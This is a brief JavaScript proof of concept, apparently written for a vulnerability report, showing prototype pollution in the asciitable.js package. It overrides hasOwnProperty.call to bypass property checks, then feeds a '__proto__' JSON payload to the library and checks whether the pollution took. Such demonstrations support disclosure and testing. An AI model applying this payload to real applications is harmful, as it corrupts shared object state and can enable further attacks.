Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req({}, b);
console.log({}.polluted);